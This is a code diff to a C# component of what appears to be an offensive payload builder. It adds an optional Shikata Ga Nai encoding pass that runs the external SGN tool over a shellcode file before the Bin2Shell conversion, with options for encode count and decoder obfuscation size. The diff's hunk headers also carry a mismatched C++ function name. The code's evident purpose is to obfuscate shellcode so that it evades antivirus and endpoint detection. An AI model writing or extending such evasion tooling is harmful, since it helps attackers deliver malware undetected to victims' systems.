@@ -1,3 +1,5 @@
+using System.ComponentModel;
+using System.Diagnostics;
 using System.Globalization;
 using System.Diagnostics.CodeAnalysis;
 using System.Security.Cryptography;
@@ -149,6 +151,28 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         "bin2ShellOptionArgs",
         "bin2shellAntiArgs",
         "bin2ShellAntiArgs"
+    };
+    private static readonly string[] ShikataEnabledKeys =
+    {
+        UiDataKeys.ShikataGaNaiEnabled,
+        "shikataGaNaiEnabled",
+        "shikataEnabled",
+        "shikata"
+    };
+    private static readonly string[] ShikataEncodeCountKeys =
+    {
+        UiDataKeys.ShikataGaNaiEncodeCount,
+        "shikataGaNaiEncodeCount",
+        "shikataEncodeCount",
+        "shikataCount",
+        "shikataEnc"
+    };
+    private static readonly string[] ShikataMaxBytesKeys =
+    {
+        UiDataKeys.ShikataGaNaiMaxBytes,
+        "shikataGaNaiMaxBytes",
+        "shikataMaxBytes",
+        "shikataMax"
     };
 
     private readonly IAppPaths _paths;
@@ -387,28 +411,161 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         if (!File.Exists(filePath))
             throw new FileNotFoundException("Shellcode file not found.", filePath);
 
-        var args = BuildBin2ShellArguments(data, filePath);
-        _logger.Debug($"Bin2Shell args: {string.Join(" ", args.Select(QuoteArg))}");
+        var shikataOptions = ResolveShikataGaNaiOptions(data);
+        string? shikataOutputPath = null;
+        var inputPath = filePath;
 
-        string encoded = await _bin2ShellRunner
-            .RunAsync(args, cancellationToken: cancellationToken)
-            .ConfigureAwait(false);
-
-        if (string.IsNullOrWhiteSpace(encoded))
-            throw new InvalidOperationException("Bin2Shell returned empty output.");
-
-        bool patched = false;
-        encoded = PatchBin2ShellPayloadLambda(encoded, out patched);
-        if (patched)
+        try
         {
-            _logger.Debug("Normalized Bin2Shell payload lambda capture.");
+            if (shikataOptions.Enabled)
+            {
+                shikataOutputPath = await ApplyShikataGaNaiAsync(filePath, shikataOptions, cancellationToken).ConfigureAwait(false);
+                inputPath = shikataOutputPath;
+                notes.Add($"Shikata Ga Nai applied (count={shikataOptions.EncodeCount}, max={shikataOptions.MaxDecoderObfuscationBytes}).");
+                _logger.Debug($"Shikata Ga Nai applied: input='{Path.GetFileName(filePath)}', output='{Path.GetFileName(shikataOutputPath)}'.");
+            }
+
+            var args = BuildBin2ShellArguments(data, inputPath);
+            _logger.Debug($"Bin2Shell args: {string.Join(" ", args.Select(QuoteArg))}");
+
+            string encoded = await _bin2ShellRunner
+                .RunAsync(args, cancellationToken: cancellationToken)
+                .ConfigureAwait(false);
+
+            if (string.IsNullOrWhiteSpace(encoded))
+                throw new InvalidOperationException("Bin2Shell returned empty output.");
+
+            bool patched = false;
+            encoded = PatchBin2ShellPayloadLambda(encoded, out patched);
+            if (patched)
+            {
+                _logger.Debug("Normalized Bin2Shell payload lambda capture.");
+            }
+
+            encoded = RepairCStringLiteralQuotes(encoded);
+
+            plan.EncodedShellcodeSnippet = encoded.Trim();
+            notes.Add("Encoded shellcode prepared.");
+            _logger.Debug("Encoded shellcode prepared.");
+        }
+        finally
+        {
+            if (!string.IsNullOrWhiteSpace(shikataOutputPath) && File.Exists(shikataOutputPath))
+            {
+                TryDeleteTempFile(shikataOutputPath);
+            }
+        }
+    }
+
+    private async Task<string> ApplyShikataGaNaiAsync(string inputPath, ShikataGaNaiOptions options, CancellationToken cancellationToken)
+    {
+        var outputDirectory = _paths.EnsureTempShellcodeDirectory();
+        var outputPath = Path.Combine(outputDirectory, $"wm_sgn_{Guid.NewGuid():N}.bin");
+        var startErrors = new List<Exception>();
+        var candidates = BuildSgnCandidates();
+
+        foreach (var candidate in candidates)
+        {
+            try
+            {
+                await RunSgnProcessAsync(candidate, inputPath, outputPath, options, cancellationToken).ConfigureAwait(false);
+                return outputPath;
+            }
+            catch (Win32Exception ex) when (ex.NativeErrorCode is 2 or 3)
+            {
+                startErrors.Add(ex);
+            }
         }
 
-        encoded = RepairCStringLiteralQuotes(encoded);
+        throw new InvalidOperationException(
+            "Shikata Ga Nai is enabled, but SGN was not found. Run 'washmachine-cli provision' or install sgn and add it to PATH.",
+            startErrors.LastOrDefault());
+    }
 
-        plan.EncodedShellcodeSnippet = encoded.Trim();
-        notes.Add("Encoded shellcode prepared.");
-        _logger.Debug("Encoded shellcode prepared.");
+    private static void TryDeleteTempFile(string path)
+    {
+        try
+        {
+            File.Delete(path);
+        }
+        catch
+        {
+            // Best-effort cleanup.
+        }
+    }
+
+    private IReadOnlyList<string> BuildSgnCandidates()
+    {
+        var candidates = new List<string>();
+        if (!string.IsNullOrWhiteSpace(_paths.SgnExecutable))
+            candidates.Add(_paths.SgnExecutable);
+        candidates.Add("sgn.exe");
+        candidates.Add("sgn");
+        return candidates;
+    }
+
+    private async Task RunSgnProcessAsync(
+        string executable,
+        string inputPath,
+        string outputPath,
+        ShikataGaNaiOptions options,
+        CancellationToken cancellationToken)
+    {
+        if (File.Exists(outputPath))
+            File.Delete(outputPath);
+
+        string? workingDirectory = null;
+        if (Path.IsPathRooted(executable))
+        {
+            workingDirectory = Path.GetDirectoryName(executable);
+        }
+
+        if (string.IsNullOrWhiteSpace(workingDirectory))
+            workingDirectory = _paths.ExecutableDirectory;
+
+        var psi = new ProcessStartInfo
+        {
+            FileName = executable,
+            WorkingDirectory = workingDirectory,
+            RedirectStandardError = true,
+            RedirectStandardOutput = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+
+        psi.ArgumentList.Add("-i");
+        psi.ArgumentList.Add(inputPath);
+        psi.ArgumentList.Add("-o");
+        psi.ArgumentList.Add(outputPath);
+        psi.ArgumentList.Add("-a");
+        psi.ArgumentList.Add("64");
+        psi.ArgumentList.Add("-c");
+        psi.ArgumentList.Add(options.EncodeCount.ToString(CultureInfo.InvariantCulture));
+        psi.ArgumentList.Add("-M");
+        psi.ArgumentList.Add(options.MaxDecoderObfuscationBytes.ToString(CultureInfo.InvariantCulture));
+
+        using var process = new Process { StartInfo = psi };
+
+        if (!process.Start())
+            throw new InvalidOperationException("Failed to start SGN process.");
+
+        Task<string> stdoutTask = process.StandardOutput.ReadToEndAsync();
+        Task<string> stderrTask = process.StandardError.ReadToEndAsync();
+
+        await process.WaitForExitAsync(cancellationToken).ConfigureAwait(false);
+
+        var stdout = await stdoutTask.ConfigureAwait(false);
+        var stderr = await stderrTask.ConfigureAwait(false);
+
+        if (process.ExitCode != 0)
+        {
+            string message = string.IsNullOrWhiteSpace(stderr) ? stdout : stderr;
+            throw new InvalidOperationException(
+                $"SGN exited with code {process.ExitCode}.{Environment.NewLine}{message}");
+        }
+
+        if (!File.Exists(outputPath))
+            throw new InvalidOperationException("SGN completed without producing an output file.");
     }
 
     private void ConfigureGenericShellcode(
@@ -1798,6 +1955,102 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         return string.Join(":", segments);
     }
 
+    private static ShikataGaNaiOptions ResolveShikataGaNaiOptions(UiData data)
+    {
+        bool enabled = TryGetBooleanValue(data, ShikataEnabledKeys, defaultValue: false);
+        int encodeCount = TryGetPositiveIntValue(data, ShikataEncodeCountKeys, defaultValue: 1);
+        int maxBytes = TryGetPositiveIntValue(data, ShikataMaxBytesKeys, defaultValue: 50);
+        return new ShikataGaNaiOptions(enabled, encodeCount, maxBytes);
+    }
+
+    private static bool TryGetBooleanValue(UiData data, IReadOnlyList<string> keys, bool defaultValue)
+    {
+        foreach (var key in keys)
+        {
+            if (TryReadTextOrComboValue(data, key, out var raw) &&
+                TryParseBoolean(raw, out var parsed))
+            {
+                return parsed;
+            }
+        }
+
+        return defaultValue;
+    }
+
+    private static int TryGetPositiveIntValue(UiData data, IReadOnlyList<string> keys, int defaultValue)
+    {
+        foreach (var key in keys)
+        {
+            if (TryReadTextOrComboValue(data, key, out var raw) &&
+                TryParsePositiveInt(raw, out var parsed))
+            {
+                return parsed;
+            }
+        }
+
+        return defaultValue;
+    }
+
+    private static bool TryReadTextOrComboValue(UiData data, string key, [NotNullWhen(true)] out string? value)
+    {
+        if (data.TextBoxes.TryGetValue(key, out var fromText))
+        {
+            value = fromText;
+            return true;
+        }
+
+        if (data.ComboBoxes.TryGetValue(key, out var fromCombo))
+        {
+            value = fromCombo;
+            return true;
+        }
+
+        value = null;
+        return false;
+    }
+
+    private static bool TryParseBoolean(string? raw, out bool value)
+    {
+        value = false;
+        if (string.IsNullOrWhiteSpace(raw))
+            return false;
+
+        var normalized = raw.Trim();
+        if (bool.TryParse(normalized, out value))
+            return true;
+
+        if (int.TryParse(normalized, NumberStyles.Integer, CultureInfo.InvariantCulture, out int numeric))
+        {
+            value = numeric != 0;
+            return true;
+        }
+
+        if (normalized.Equals("yes", StringComparison.OrdinalIgnoreCase) ||
+            normalized.Equals("on", StringComparison.OrdinalIgnoreCase))
+        {
+            value = true;
+            return true;
+        }
+
+        if (normalized.Equals("no", StringComparison.OrdinalIgnoreCase) ||
+            normalized.Equals("off", StringComparison.OrdinalIgnoreCase))
+        {
+            value = false;
+            return true;
+        }
+
+        return false;
+    }
+
+    private static bool TryParsePositiveInt(string? raw, out int value)
+    {
+        value = 0;
+        if (string.IsNullOrWhiteSpace(raw))
+            return false;
+
+        return int.TryParse(raw.Trim(), NumberStyles.Integer, CultureInfo.InvariantCulture, out value) && value > 0;
+    }
+
     private static bool TryParseIndex(string? raw, out int index)
     {
         index = 0;
@@ -1899,6 +2152,8 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
         return 0;
     }
+
+    private sealed record ShikataGaNaiOptions(bool Enabled, int EncodeCount, int MaxDecoderObfuscationBytes);
 
     private ShellcodeSource DetermineShellcodeSource(UiData data)
     {
